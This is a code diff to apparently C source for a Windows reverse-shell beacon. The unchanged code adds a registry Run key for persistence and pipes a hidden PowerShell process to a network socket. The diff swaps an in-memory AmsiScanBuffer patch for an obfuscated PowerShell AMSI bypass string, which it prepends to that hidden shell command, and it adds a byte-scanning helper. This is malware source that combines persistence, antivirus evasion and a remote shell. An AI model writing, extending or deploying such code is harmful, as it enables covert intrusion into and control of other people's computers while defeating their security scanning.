@@ -13,6 +13,8 @@
 #pragma comment(linked, "/ENTRY:entry")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "rpcrt4.lib")
+#pragma comment(lib, "ntdll")
+
 
 
 
@@ -60,26 +62,25 @@ void persistence(){
     system("cmd /c REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D \"C:\\temp\\conhost.exe\""); //add registry persistence 
 }
 
+DWORD64 GetAddr(LPVOID addr) {
 
-int patch_amsi() {
-	DWORD dwOld = 0;
-	DWORD offset = 0x83;
-	FARPROC ptrAmsiScanBuffer = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
-	VirtualProtect(ptrAmsiScanBuffer + offset, 1, PAGE_EXECUTE_READWRITE, &dwOld);
-	memcpy(ptrAmsiScanBuffer + offset, "\x74", 1);
-	VirtualProtect(ptrAmsiScanBuffer + offset, 1, dwOld, &dwOld);
-	return 0;
+	for (int i = 0; i < 1024; i++) {
+		
+		if (*((PBYTE)addr + i) == 0x74) return (DWORD64)addr + i;
+	}
+
 }
 
 
+
 void evasion(){
-    patch_amsi();
     printf("weoof");
 }
 
 void beacon_connect_to_server(char IP[16], int PORT){
     persistence();
     evasion();
+
     WSADATA wsaData;
 	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
 		printf("[ERROR] WSASturtup failed.\n");
@@ -125,8 +126,10 @@ void beacon_connect_to_server(char IP[16], int PORT){
         sinfo.hStdOutput = (HANDLE)s;
         sinfo.hStdError = (HANDLE)s;
         PROCESS_INFORMATION pinfo;
+        //Patch AMSI
+        char patch_amsi[] = "[Ref].Assembly.GetType('System.Management.Automation.'+$(\"41 6D 73 69 55 74 69 6C 73\".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($(\"61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64\".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true) | ";
         char proc[] = "powershell.exe -WindowStyle Hidden";
-        CreateProcessA(NULL, proc, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+        CreateProcessA(NULL, strcat(patch_amsi, proc), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
         WaitForSingleObject(pinfo.hProcess, INFINITE);
         CloseHandle(pinfo.hProcess);
         CloseHandle(pinfo.hThread);
